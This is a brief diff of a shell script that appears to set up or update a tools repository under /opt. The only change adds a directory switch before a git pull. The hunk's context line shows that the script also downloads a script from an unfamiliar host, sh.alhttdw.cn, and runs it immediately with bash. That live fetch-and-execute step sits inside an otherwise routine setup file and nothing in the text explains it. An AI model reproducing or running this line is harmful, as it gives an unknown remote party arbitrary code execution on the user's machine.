@@ -5,7 +5,7 @@ wget sh.alhttdw.cn/d11.sh && bash d11.sh
 directory="/opt/tools"
 
 if [ -d "$directory" ]; then
-    git pull origin main
+    cd /opt && git pull origin main
 else
    cd /opt && git clone https://github.com/dayupup123/tools.git
 fi
